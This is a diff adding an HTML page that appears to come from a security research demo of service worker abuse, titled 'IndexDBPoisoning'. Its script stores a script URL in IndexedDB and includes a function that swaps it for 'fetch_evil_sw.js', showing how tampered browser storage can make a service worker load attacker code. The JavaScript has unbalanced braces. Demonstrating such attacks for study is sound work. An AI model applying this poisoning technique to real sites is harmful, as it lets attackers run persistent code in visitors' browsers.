@@ -1,0 +1,62 @@
+<!doctype html><html>
+  <head><meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1">
+   <head>
+    <title>SW_Demo</title><meta name=theme-color content=#2e3aa1>
+    <link rel=manifest href=../../manifest2.json>
+    <link rel="shortcut icon" href=../../images/logo-32x32.png>
+    <link rel=stylesheet href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <link rel=stylesheet href=https://storage.googleapis.com/code.getmdl.io/1.0.6/material.indigo-pink.min.css>    
+    <script src=https://storage.googleapis.com/code.getmdl.io/1.0.6/material.min.js></script>
+    <link rel=stylesheet href=../../styles/main.css>
+	   <script type='text/javascript'>
+          const request = indexedDB.open('demo_db', 1);
+          request.onsuccess = (event) => {
+                 var db = event.target.result;
+                 db.createObjectStore('urls',{keyPath:'id'}); 
+                 var txn = db.transaction('urls','readwrite')
+                 txn.onsuccess =  function(ev){
+                     alert('Benign URL Added!!')
+                 }
+                 var store = txn.objectStore('urls')
+                 store.put({'id':'imp_url', 'url':'https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js'})
+             });
+          }
+
+          if('serviceWorker' in navigator) {
+              navigator.serviceWorker.register('./sw.js');
+          };
+          
+          function modify_indexDB(){
+              const request = indexedDB.open('demo_db', 1);
+              request.onsuccess = (event) => {
+                     var db = event.target.result;
+                     var txn = db.transaction('urls','readwrite')
+                     txn.onsuccess =  function(ev){
+                         alert('URL Modified!!. Reload Page')
+                     }
+                     var store = txn.objectStore('urls')
+                     store.put({'id':'imp_url', 'url':'https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_evil_sw.js'})
+                 });
+              }
+          }
+    </script>
+  </head>
+<body>
+  <div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
+  <header class=mdl-layout__header>
+    <div class=mdl-layout__header-row><span class=mdl-layout-title>SW Abuse Demo - IndexDBPoisoning</span>
+      <div class=mdl-layout-spacer></div>
+      <nav class="mdl-navigation"><a class=mdl-navigation__link href=https://demopwa.github.io/sw_index.html>Home</a> </nav>
+    </div>
+  </header>
+    <main>
+        <h1> Redirected to Attacker Page!!! </h1>
+ 	 <div>
+	</div>
+	    
+  </main>
+  </div>
+  
+  
+ </body>
+ </html>
